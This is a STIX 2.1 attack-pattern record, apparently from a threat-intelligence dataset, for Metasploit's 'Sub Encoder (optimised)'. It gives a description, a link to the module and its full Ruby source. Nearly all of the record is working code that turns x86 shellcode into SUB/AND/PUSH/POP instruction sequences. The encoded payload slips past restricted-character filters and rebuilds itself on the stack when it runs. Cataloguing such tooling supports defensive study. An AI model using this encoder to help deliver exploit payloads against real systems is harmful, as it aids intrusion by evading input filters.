{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--469d3eaa-5457-4e0d-9085-15b68a7eec98",
    "created": "2024-08-14T16:33:19.210057Z",
    "modified": "2024-08-14T16:33:19.21006Z",
    "name": "Sub Encoder (optimised)",
    "description": " Encodes a payload using a series of SUB instructions and writing the encoded value to ESP. This concept is based on the known SUB encoding approach that is widely used to manually encode payloads with very restricted allowed character sets. It will not reset EAX to zero unless absolutely necessary, which helps reduce the payload by 10 bytes for every 4-byte chunk. ADD support hasn't been included as the SUB instruction is more likely to avoid bad characters anyway.  The payload requires a base register to work off which gives the start location of the encoder payload in memory. If not specified, it defaults to ESP. If the given register doesn't point exactly to the start of the payload then an offset value is also required.  Note: Due to the fact that many payloads use the FSTENV approach to get the current location in memory there is an option to protect the start of the payload by setting the 'OverwriteProtect' flag to true. This adds 3-bytes to the start of the payload to bump ESP by 32 bytes so that it's clear of the top of the payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/opt_sub.rb",
            "external_id": "opt_sub.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder\n  Rank = ManualRanking\n\n  ASM_SUBESP20 = \"\\x83\\xEC\\x20\"\n\n  SET_ALPHA    = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\n  SET_SYM      = '!@#$%^&*()_+\\\\-=[]{};\\'\":<>,.?/|~'\n  SET_NUM      = '0123456789'\n  SET_FILESYM  = '()_+-=\\\\/.,[]{}@!$%^&='\n\n  CHAR_SET_ALPHA         = SET_ALPHA + SET_SYM\n  CHAR_SET_ALPHANUM      = SET_ALPHA + SET_NUM + SET_SYM\n  CHAR_SET_FILEPATH      = SET_ALPHA + SET_NUM + SET_FILESYM\n\n  def initialize\n    super(\n      'Name'             => 'Sub Encoder (optimised)',\n      'Description'      => %q{\n        Encodes a payload using a series of SUB instructions and writing the\n        encoded value to ESP. This concept is based on the known SUB encoding\n        approach that is widely used to manually encode payloads with very\n        restricted allowed character sets. It will not reset EAX to zero unless\n        absolutely necessary, which helps reduce the payload by 10 bytes for\n        every 4-byte chunk. ADD support hasn't been included as the SUB\n        instruction is more likely to avoid bad characters anyway.\n\n        The payload requires a base register to work off which gives the start\n        location of the encoder payload in memory. If not specified, it defaults\n        to ESP. If the given register doesn't point exactly to the start of the\n        payload then an offset value is also required.\n\n        Note: Due to the fact that many payloads use the FSTENV approach to\n        get the current location in memory there is an option to protect the\n        start of the payload by setting the 'OverwriteProtect' flag to true.\n        This adds 3-bytes to the start of the payload to bump ESP by 32 bytes\n        so that it's clear of the top of the payload.\n      },\n      'Author'           => 'OJ Reeves <oj[at]buffered.io>',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'Decoder'          => { 'BlockSize'  => 4 }\n    )\n\n    register_options(\n      [\n        OptString.new( 'ValidCharSet', [ false, \"Specify a known set of valid chars (ALPHA, ALPHANUM, FILEPATH)\" ]),\n        OptBool.new( 'OverwriteProtect', [ false, \"Indicate if the encoded payload requires protection against being overwritten\", false])\n      ],\n      self.class)\n  end\n\n  #\n  # Conver the shellcode into a set of 4-byte chunks that can be\n  # encoding while making sure it is 4-byte aligned.\n  #\n  def prepare_shellcode(sc, protect_payload)\n    # first instructions need to be ESP offsetting if the payload\n    # needs to be protected\n    sc = ASM_SUBESP20 + sc if protect_payload == true\n\n    # first of all we need to 4-byte align the payload if it\n    # isn't already aligned, by prepending NOPs.\n    rem = sc.length % 4\n    sc = @asm['NOP'] * (4 - rem) + sc if rem != 0\n\n    # next we break it up into 4-byte chunks, convert to an unsigned\n    # int block so calculations are easy\n    chunks = []\n    sc = sc.bytes.to_a\n    while sc.length > 0\n      chunk = sc.shift + (sc.shift << 8) + (sc.shift << 16) + (sc.shift << 24)\n      chunks << chunk\n    end\n\n    # return the array in reverse as this is the order the instructions\n    # will be written to the stack.\n    chunks.reverse\n  end\n\n  #\n  # From the list of characters given, find two bytes that when\n  # ANDed together result in 0. Returns nil if not found.\n  #\n  def find_opposite_bytes(list)\n    list.each_char do |b1|\n      list.each_char do |b2|\n        if b1.ord & b2.ord == 0\n          return (b1 * 4), (b2 * 4)\n        end\n      end\n    end\n    return nil, nil\n  end\n\n  #\n  # Entry point to the decoder.\n  #\n  def decoder_stub(state)\n    return state.decoder_stub if state.decoder_stub\n\n    # configure our instruction dictionary\n    @asm = {\n      'NOP' => \"\\x90\",\n      'AND' => { 'EAX' => \"\\x25\" },\n      'SUB' => { 'EAX' => \"\\x2D\" },\n      'PUSH' => {\n        'EBP' => \"\\x55\", 'ESP' => \"\\x54\",\n        'EAX' => \"\\x50\", 'EBX' => \"\\x53\",\n        'ECX' => \"\\x51\", 'EDX' => \"\\x52\",\n        'EDI' => \"\\x57\", 'ESI' => \"\\x56\"\n      },\n      'POP' => { 'ESP' => \"\\x5C\", 'EAX' => \"\\x58\", }\n    }\n\n    # set up our base register, defaulting to ESP if not specified\n    @base_reg = (datastore['BufferRegister'] || 'ESP').upcase\n\n    # determine the required bytes\n    @required_bytes =\n      @asm['AND']['EAX']  +\n      @asm['SUB']['EAX']  +\n      @asm['PUSH']['EAX'] +\n      @asm['POP']['ESP']  +\n      @asm['POP']['EAX']  +\n      @asm['PUSH'][@base_reg]\n\n    # generate a sorted list of valid characters\n    char_set = \"\"\n    case (datastore['ValidCharSet'] || \"\").upcase\n    when 'ALPHA'\n      char_set = CHAR_SET_ALPHA\n    when 'ALPHANUM'\n      char_set = CHAR_SET_ALPHANUM\n    when 'FILEPATH'\n      char_set = CHAR_SET_FILEPATH\n    else\n      for i in 0 .. 255\n        char_set += i.chr.to_s\n      end\n    end\n\n    # remove any bad chars and populate our valid chars array.\n    @valid_chars = \"\"\n    char_set.each_char do |c|\n      @valid_chars << c.to_s unless state.badchars.include?(c.to_s)\n    end\n\n    # we need the valid chars sorted because of the algorithm we use\n    @valid_chars = @valid_chars.chars.sort.join\n    @valid_bytes = @valid_chars.bytes.to_a\n\n    all_bytes_valid = @required_bytes.bytes.reduce(true) { |a, byte| a && @valid_bytes.include?(byte) }\n\n    # determine if we have any invalid characters that we rely on.\n    unless all_bytes_valid\n      raise EncodingError, \"Bad character set contains characters that are required for this encoder to function.\"\n    end\n\n    unless @asm['PUSH'][@base_reg]\n      raise EncodingError, \"Invalid base register\"\n    end\n\n    # get the offset from the specified base register, or default to zero if not specifed\n    reg_offset = (datastore['BufferOffset'] || 0).to_i\n\n    # calculate two opposing values which we can use for zeroing out EAX\n    @clear1, @clear2 = find_opposite_bytes(@valid_chars)\n\n    # if we can't then we bomb, because we know we need to clear out EAX at least once\n    unless @clear1\n      raise EncodingError, \"Unable to find AND-able chars resulting 0 in the valid character set.\"\n    end\n\n    # with everything set up, we can now call the encoding routine\n    state.decoder_stub = encode_payload(state.buf, reg_offset, datastore['OverwriteProtect'])\n\n    state.buf = \"\"\n    state.decoder_stub\n  end\n\n  #\n  # Determine the bytes, if any, that will result in the given chunk\n  # being decoded using SUB instructions from the previous EAX value\n  #\n  def sub_3(chunk, previous)\n    carry = 0\n    shift = 0\n    target = previous - chunk\n    sum = [0, 0, 0]\n\n    4.times do |idx|\n      b = (target >> shift) & 0xFF\n      lo = md = hi = 0\n\n      # keep going through the character list under the \"lowest\" valid\n      # becomes too high (ie. we run out)\n      while lo < @valid_bytes.length\n        # get the total of the three current bytes, including the carry from\n        # the previous calculation\n        total = @valid_bytes[lo] + @valid_bytes[md] + @valid_bytes[hi] + carry\n\n        # if we matched a byte...\n        if (total & 0xFF) == b\n          # store the carry for the next calculation\n          carry = (total >> 8) & 0xFF\n\n          # store the values in the respective locations\n          sum[2] |= @valid_bytes[lo] << shift\n          sum[1] |= @valid_bytes[md] << shift\n          sum[0] |= @valid_bytes[hi] << shift\n          break\n        end\n\n        hi += 1\n        if hi >= @valid_bytes.length\n          md += 1\n          hi = md\n        end\n\n        if md >= @valid_bytes.length\n          lo += 1\n          hi = md = lo\n        end\n      end\n\n      # we ran out of chars to try\n      if lo >= @valid_bytes.length\n        return nil, nil\n      end\n\n      shift += 8\n    end\n\n    return sum, chunk\n  end\n\n  #\n  # Helper that writes instructions to zero out EAX using two AND instructions.\n  #\n  def zero_eax\n    data = \"\"\n    data << @asm['AND']['EAX']\n    data << @clear1\n    data << @asm['AND']['EAX']\n    data << @clear2\n    data\n  end\n\n  #\n  # Write instructions that perform the subtraction using the given encoded numbers.\n  #\n  def create_sub(encoded)\n    data = \"\"\n    encoded.each do |e|\n      data << @asm['SUB']['EAX']\n      data << [e].pack(\"L\")\n    end\n    data << @asm['PUSH']['EAX']\n    data\n  end\n\n  #\n  # Encoding the specified payload buffer.\n  #\n  def encode_payload(buf, reg_offset, protect_payload)\n    data = \"\"\n\n    # prepare the shellcode for munging\n    chunks = prepare_shellcode(buf, protect_payload)\n\n    # start by reading the value from the base register and dropping it into EAX for munging\n    data << @asm['PUSH'][@base_reg]\n    data << @asm['POP']['EAX']\n\n    # store the offset of the stubbed placeholder\n    base_reg_offset = data.length\n\n    # Write out a stubbed placeholder for the offset instruction based on\n    # the base register, we'll update this later on when we know how big our payload is.\n    encoded, _ = sub_3(0, 0)\n    raise EncodingError, \"Couldn't offset base register.\" if encoded.nil?\n    data << create_sub(encoded)\n\n    # finally push the value of EAX back into ESP\n    data << @asm['PUSH']['EAX']\n    data << @asm['POP']['ESP']\n\n    # start instruction encoding from a clean slate\n    data << zero_eax\n\n    # keep track of the previous instruction, because we use that as the starting point\n    # for the next instruction, which saves us 10 bytes per 4 byte block. If we can't\n    # offset correctly, we zero EAX and try again.\n    previous = 0\n    chunks.each do |chunk|\n      encoded, previous = sub_3(chunk, previous)\n\n      if encoded.nil?\n        # try again with EAX zero'd out\n        data << zero_eax\n        encoded, previous = sub_3(chunk, 0)\n      end\n\n      # if we're still nil here, then we have an issue\n      raise EncodingError, \"Couldn't encode payload\" if encoded.nil?\n\n      data << create_sub(encoded)\n    end\n\n    # Now that the entire payload has been generated, we figure out offsets\n    # based on sizes so that the payload overlaps perfectly with the end of\n    # our decoder\n    total_offset = reg_offset + data.length + (chunks.length * 4) - 1\n    encoded, _ = sub_3(total_offset, 0)\n\n    # if we're still nil here, then we have an issue\n    raise EncodingError, \"Couldn't encode protection\" if encoded.nil?\n    patch = create_sub(encoded)\n\n    # patch in the correct offset back at the start of our payload\n    data[base_reg_offset .. base_reg_offset + patch.length] = patch\n\n    # and we're done finally!\n    data\n  end\nend\n\n"
}